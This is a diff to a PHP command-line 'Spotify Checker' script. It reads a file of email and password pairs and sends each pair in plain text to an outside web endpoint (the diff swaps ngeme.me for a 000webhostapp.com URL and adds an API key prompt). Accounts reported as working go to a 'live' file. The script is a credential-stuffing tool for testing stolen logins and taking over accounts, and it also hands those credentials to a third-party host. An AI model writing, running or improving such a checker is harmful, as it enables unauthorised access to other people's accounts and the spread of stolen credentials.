@@ -10,9 +10,16 @@ function in_string($s,$as) {
 echo "============================================\n";
 echo "              Spotify Checker "; 
 echo "\n============================================\n";
-echo "Created by : \033[92mmbul48 \n\033[0mAPI From   : \033[95mmbul48 \033[0m\nInstagram  : @mbul48\n";
+echo "Created by : \033[92mmbul48 \n\033[0mAPI From   : \033[95mmbul48 \033[0m\nInstagram  : mbul48\n";
 echo "============================================\n";
-$file = file_get_contents("list.txt");
+
+echo "Apikey \t\t: ";
+$apikey = trim(fgets(STDIN));
+
+echo "List \t\t: ";
+$list = trim(fgets(STDIN));
+
+$file = file_get_contents("$list");
 $data = explode("\n",$file);
 $jumlah= 0; $live=0; $mati=0;
 for($a=0;$a<count($data);$a++){
@@ -24,7 +31,7 @@ for($a=0;$a<count($data);$a++){
 		$json = json_decode($get,true);
 		$pass = $json['password'];
 	}
-	$cek = @file_get_contents("http://ngeme.me/spotify.php?email=$email&pass=$pass");
+	$cek = @file_get_contents("https://testnanikore.000webhostapp.com/index.php?email=$email&pass=$pass&apikey=$apikey");
 	if (strpos($cek,"Spotify")) {
  if(!in_array($cek,explode("\n",@file_get_contents("spotify-live.txt")))){
   $h=fopen("spotify-live.txt","a");
@@ -44,3 +51,4 @@ for($a=0;$a<count($data);$a++){
 	echo "Account \033[92mLive: $live \033[0mand account \033[91mDie: $mati\033[0m \n";
 	echo "\033[92mE\033[0m\033[93mN\033[0m\033[94mJ\033[0m\033[95mO\033[0m\033[96mY\033[0m\033[91mY\033[0m\n";
 
+?>
